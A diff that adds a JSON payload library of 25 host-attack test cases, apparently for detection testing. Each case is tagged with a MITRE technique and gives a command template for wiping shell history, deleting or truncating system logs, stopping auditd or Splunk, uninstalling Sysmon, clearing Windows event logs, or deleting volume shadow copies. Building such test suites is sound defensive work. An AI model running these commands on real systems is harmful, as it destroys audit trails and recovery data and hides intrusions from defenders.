@@ -1,0 +1,929 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: history -c",
+    "payload_external_id": "HIDS-TRACECLEANUP-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "bash 内存 history 清空当前 session。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "history -c",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "history:cleared"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: unset HISTFILE",
+    "payload_external_id": "HIDS-TRACECLEANUP-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "unset HISTFILE 禁止写入磁盘历史。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "unset HISTFILE;unset HISTSIZE",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "env:HISTFILE_unset"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: rm .bash_history",
+    "payload_external_id": "HIDS-TRACECLEANUP-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "直接删除 .bash_history。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "rm -f ~/.bash_history",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_delete:~/.bash_history"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: link to /dev/null",
+    "payload_external_id": "HIDS-TRACECLEANUP-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "把 .bash_history 链接到 /dev/null。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ln -sf /dev/null ~/.bash_history",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:~/.bash_history"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: shred bash_history",
+    "payload_external_id": "HIDS-TRACECLEANUP-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "shred -u 多次覆写 + 删 .bash_history。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "shred -fzu ~/.bash_history",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_delete:~/.bash_history"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: auth log rm",
+    "payload_external_id": "HIDS-TRACECLEANUP-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "删 /var/log/auth.log / secure。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "rm -f /var/log/auth.log /var/log/secure /var/log/messages",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_delete:/var/log/auth.log"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: logrotate force",
+    "payload_external_id": "HIDS-TRACECLEANUP-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "logrotate -f 强制立即轮转（旧日志移走）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "logrotate -f /etc/logrotate.conf",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:logrotate"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: journalctl vacuum",
+    "payload_external_id": "HIDS-TRACECLEANUP-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "systemd-journald 清空磁盘上的 journal。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "journalctl --rotate;journalctl --vacuum-time=1s",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:journalctl"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: lastlog clear",
+    "payload_external_id": "HIDS-TRACECLEANUP-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/var/log/lastlog 截 0 字节。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "cat /dev/null > /var/log/lastlog",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_truncate:/var/log/lastlog"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: wtmp/utmp zero",
+    "payload_external_id": "HIDS-TRACECLEANUP-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/var/log/wtmp & /var/run/utmp 清空。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "cat /dev/null > /var/log/wtmp;cat /dev/null > /var/run/utmp",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_truncate:/var/log/wtmp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: btmp zero",
+    "payload_external_id": "HIDS-TRACECLEANUP-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/var/log/btmp 失败登录日志清空。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "cat /dev/null > /var/log/btmp",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_truncate:/var/log/btmp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: faillog clear",
+    "payload_external_id": "HIDS-TRACECLEANUP-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "faillog -r 清空登录失败记录。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "faillog -r",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:faillog"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: dmesg -C",
+    "payload_external_id": "HIDS-TRACECLEANUP-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "dmesg -C 清空 kernel ring buffer。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "dmesg -C",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:dmesg"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: audit cleanup",
+    "payload_external_id": "HIDS-TRACECLEANUP-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "auditctl -D 删所有 audit 规则。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1562.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "auditctl -D",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:auditctl"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: audit disable",
+    "payload_external_id": "HIDS-TRACECLEANUP-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "systemctl stop auditd 停审计。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1562.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "systemctl stop auditd;systemctl disable auditd",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "svc_stop:auditd"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: rsyslog redirect",
+    "payload_external_id": "HIDS-TRACECLEANUP-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/rsyslog.conf 把日志重定向到 /dev/null。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1562.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "sed -i 's|.*\\.\\*.*-/var/log/\\(.*\\)$|*.* /dev/null|' /etc/rsyslog.conf;systemctl restart rsyslog",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:rsyslog.conf",
+      "svc_restart:rsyslog"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: splunk forwarder kill",
+    "payload_external_id": "HIDS-TRACECLEANUP-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "kill splunkd 阻断日志上送。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1562.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "killall -9 splunkd;systemctl stop SplunkForwarder",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc_kill:splunkd"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: sysmon uninstall",
+    "payload_external_id": "HIDS-TRACECLEANUP-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Windows Sysmon 卸载 (Microsoft EDR-lite)。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1562.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "sysmon.exe -u force",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:sysmon.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: set +o history",
+    "payload_external_id": "HIDS-TRACECLEANUP-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "bash 临时关闭历史记录。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "set +o history",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "env:HIST_off"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: eventlog clear PS",
+    "payload_external_id": "HIDS-TRACECLEANUP-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Powershell Clear-EventLog 清单 Windows 事件日志。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "Clear-EventLog -LogName Security,System,Application",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "eventlog:cleared"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: wevtutil cl",
+    "payload_external_id": "HIDS-TRACECLEANUP-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "wevtutil cl Security 清空特定 channel。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "wevtutil cl Security & wevtutil cl Application & wevtutil cl System",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:wevtutil.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: wmic shadowcopy delete",
+    "payload_external_id": "HIDS-TRACECLEANUP-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "wmic 删除卷影副本（防止恢复）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1490"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "wmic shadowcopy delete /nointeractive",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:wmic.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: vssadmin delete",
+    "payload_external_id": "HIDS-TRACECLEANUP-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "vssadmin delete shadows 一行清掉（勒索家族常用）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1490"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "vssadmin delete shadows /all /quiet",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:vssadmin.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: nf log clear",
+    "payload_external_id": "HIDS-TRACECLEANUP-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "iptables/nft log chain 删除。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "iptables -F LOG_DROP 2>/dev/null;nft delete chain inet filter LOG_DROP 2>/dev/null",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:iptables",
+      "proc:nft"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Trace Cleanup: bash -x off",
+    "payload_external_id": "HIDS-TRACECLEANUP-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PS4='+ '; set +x —— 关闭命令 trace。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1070.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "trace_cleanup"
+    ],
+    "hids_category": "trace_cleanup",
+    "hids_execution_mode": "command",
+    "hids_command_template": "set +x;export PS4=''",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "env:trace_off"
+    ]
+  }
+]
